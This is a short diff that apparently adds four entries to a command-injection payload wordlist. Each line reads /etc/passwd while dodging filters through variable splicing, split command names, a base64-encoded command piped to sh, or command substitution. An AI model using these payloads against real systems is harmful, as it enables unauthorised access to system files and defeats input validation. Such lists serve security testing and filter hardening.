@@ -1,0 +1,4 @@
+c${Z}at /etc/passwd
+a=c;b=at;$a$b /etc/passwd
+$(echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh)
+$(echo "cat /etc/passwd" | tr -d '\n')
